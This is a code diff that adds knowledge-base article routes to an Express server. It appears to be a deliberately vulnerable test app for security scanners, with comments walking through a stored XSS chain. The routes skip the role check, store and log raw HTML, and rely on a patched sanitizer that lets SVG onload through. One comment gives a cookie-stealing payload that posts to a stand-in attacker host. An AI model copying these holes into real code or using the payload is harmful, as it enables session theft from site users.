@@ -1209,5 +1209,107 @@ export async function registerRoutes(
     } catch (e: any) { res.status(500).json({ message: e.message }); }
   });
 
+  // ── KB ARTICLES ────────────────────────────────────────────────────────────
+  //
+  // These routes back the "Security Articles" tab of the Knowledge Base page.
+  // The frontend renders article bodies via:
+  //
+  //   contentDiv.innerHTML = formatContent(apiResponse.body)
+  //
+  // where formatContent() calls the vendored, locally-patched DOMPurify
+  // (client/src/vendor/dompurify-custom/purify.js).
+  //
+  // VULN CHAIN:
+  //   1. POST /api/kb/articles — requireAuth but NO role check.
+  //      Any authenticated user (including free-tier) can author articles.
+  //      Body is stored raw — no server-side sanitization.
+  //
+  //   2. GET /api/kb/articles/:id — returns body verbatim from DB.
+  //      Frontend receives <svg onload="..."> unchanged.
+  //
+  //   3. Frontend: innerHTML = formatContent(body)
+  //      formatContent() calls SentinelPurify.sanitize() from the vendored fork.
+  //      The sentinel-1.2 patch added an SVG fast-path that skips on* handler
+  //      removal — so <svg onload="alert(document.cookie)"> survives sanitization.
+  //
+  //   4. The browser executes the handler in the context of any viewer's session.
+  //      Stored XSS — CWE-79, CVSS 8.8 (high), authenticated attacker → any user.
+  //
+  // SCANNER PERSPECTIVE:
+  //   A SAST tool tracing data flow from the API response to innerHTML correctly
+  //   flags this as a taint path. It sees formatContent() in the call chain and
+  //   reads its source — but it does NOT clear the taint, because SentinelPurify
+  //   is an unrecognised, non-canonical sanitization library. The tool only trusts
+  //   the canonical dompurify npm package (import DOMPurify from 'dompurify').
+  //   The finding remains HIGH even though a sanitizer is nominally present.
+
+  // GET /api/kb/articles — list all articles (auth required)
+  // VULN: Any authenticated user can read all articles including those with
+  //       injected payloads stored by another attacker.
+  app.get("/api/kb/articles", requireAuth, async (_req, res) => {
+    try {
+      const articles = await storage.getKbArticles();
+      res.json(articles);
+    } catch (e: any) { res.status(500).json({ message: e.message }); }
+  });
+
+  // GET /api/kb/articles/:id — fetch single article body verbatim
+  // VULN: body returned raw — scanner sees this as the source of tainted data
+  //       flowing into innerHTML on the client.
+  app.get("/api/kb/articles/:id", requireAuth, async (req, res) => {
+    try {
+      const article = await storage.getKbArticle(parseInt(req.params.id));
+      if (!article) return res.status(404).json({ message: "Article not found" });
+      // VULN: body logged verbatim by the Express response logger in server/index.ts.
+      //       If the body contains a stored XSS payload it appears in plaintext logs.
+      res.json(article);
+    } catch (e: any) { res.status(500).json({ message: e.message }); }
+  });
+
+  // POST /api/kb/articles — create a new article
+  // VULN: requireAuth applied, but NO role check — any free-tier user can POST.
+  // VULN: body accepted and stored raw — no sanitization performed server-side.
+  // Exploit: POST { title: "...", slug: "...", body: '<svg onload="fetch(\"https://attacker.io/c=\"+document.cookie)">' }
+  app.post("/api/kb/articles", requireAuth, async (req: any, res) => {
+    try {
+      const { title, slug, body, category, tags } = req.body;
+      if (!title || !slug || !body) {
+        return res.status(400).json({ message: "title, slug, and body are required" });
+      }
+
+      // VULN: authorId taken from the JWT payload (req.user.userId) — which is correct
+      //       for attribution, but there is no check that req.user.role === 'admin'.
+      //       Any authenticated user becomes an article author.
+      const article = await storage.createKbArticle({
+        title,
+        slug,
+        // VULN: body stored without sanitization — attacker-controlled HTML persisted as-is
+        body,
+        authorId: req.user?.userId ?? null,
+        category: category ?? "general",
+        tags:     tags ?? null,
+      });
+
+      console.log(JSON.stringify({
+        timestamp: new Date().toISOString(),
+        level:    "INFO",
+        category: "KB_ARTICLE_CREATE",
+        articleId: article.id,
+        slug:      article.slug,
+        authorId:  article.authorId,
+        // VULN: raw body logged — stored XSS payload visible in log stream
+        body:      article.body,
+        note:      "Body stored and logged without server-side sanitization",
+      }));
+
+      res.status(201).json(article);
+    } catch (e: any) {
+      if (e.message?.includes("unique")) {
+        return res.status(409).json({ message: "An article with that slug already exists." });
+      }
+      res.status(500).json({ message: e.message });
+    }
+  });
+
   return httpServer;
 }
